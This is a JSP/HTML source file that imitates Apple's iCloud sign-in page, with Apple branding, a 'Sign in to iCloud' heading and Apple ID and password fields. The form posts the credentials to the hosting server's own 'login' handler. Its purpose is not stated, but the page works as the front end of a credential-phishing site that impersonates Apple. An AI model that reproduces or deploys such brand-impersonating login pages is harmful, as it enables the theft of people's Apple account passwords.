<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>iCloud</title>

        <!-- logo -->
        <link rel="shortcut icon" href="apple.png" type="image/png">

        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

        <!-- Style.css -->
        <link rel="stylesheet" href="style.css">
    </head>
<body>
    <div class="top">
        <img id="top_bg_img" src="./top_back_img.PNG" alt="top_img">
    </div>
    <!-- <div class="back">
        <div class="top-box">
           <div class="top-circles c1"></div> 
           <div class="top-circles c2"></div> 
           <div class="top-circles c3"></div> 
           <div class="top-circles c4"></div> 
           <div class="top-circles c5"></div> 
           <div class="top-circles c6"></div> 
        </div>
        <div class="bottom-box">
            <div class="bottom-circles tc1"></div> 
            <div class="bottom-circles tc2"></div> 
            <div class="bottom-circles tc3"></div> 
            <div class="bottom-circles tc4"></div> 
         </div>
    </div> -->
    <div class="main">
        <div class="box-element be1"><img src="./cloud-img.PNG" alt=""></div>
        <div class="box-element be2"><span id="text">Sign in to iCloud</span></div>
        <div class="box-element be3">
            <form action="login" method="post">
                <div class="form-group">
                <input type="text" name="id" class="form-control" id="input-field" placeholder="Apple ID" required><a class="btn" href=""></a>
            </div>
            <div class="form-group">
                <input type="password" name="password" class="form-control" id="input-field2" placeholder="password" required><button type="submit" class="btn"><img id="btn-image2" src="./btn-image.PNG" alt=""></button>
            </div>
            </form>
        </div>
        <div class="box-element be4">
        <form action="">
            <input type="checkbox">&nbsp; &nbsp;<span>Keep me signed in</span>
        </form>
        </div>
        <div class="box-element be5"><a href="#">Forgotten your Apple ID or password?</a></div>
        <center>
        <div class="box-element be6">
            <span class="bottom-element">Create Apple ID</span>
            <span class="bottom-element">System Status</span>
            <span class="bottom-element">Privacy Policy</span>
            <span class="bottom-element">Terms & Conditions</span>
            <span class="bottom-element">Copyright 2021 Apple Inc. All rights reserved.</span>
        </div>
    </center>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>
</html>